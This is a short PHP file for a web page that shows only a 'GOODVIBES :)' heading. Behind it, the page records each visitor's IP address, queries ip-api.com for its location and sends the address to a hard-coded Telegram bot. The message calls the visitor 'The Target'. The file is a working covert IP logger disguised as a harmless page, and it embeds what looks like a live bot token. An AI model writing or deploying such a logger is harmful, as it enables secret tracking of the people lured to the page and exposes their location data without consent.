<?php

function telegram($msg) {
        global 
          $telegrambot,$telegramchatid;
        $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>
$telegramchatid,'text'=>$msg);
        $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
        $context = stream_context_create($options);
        $result = file_get_contents($url,false,$context);
        return $result;
}

$telegrambot = ' 6687166596:AAFYxzo4AHkucSKZTASpVS1219kVQrkSp3M ';
$telegramchatid = 6467994085 ;

$ip = $_SERVER['REMOTE_ADDR']; json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

telegram("
     
   The Target Enterd your web logger
   IP : $ip
        
        ");
?>

<html>
  <h1>
    GOODVIBES :)
  </h1>  
</html>


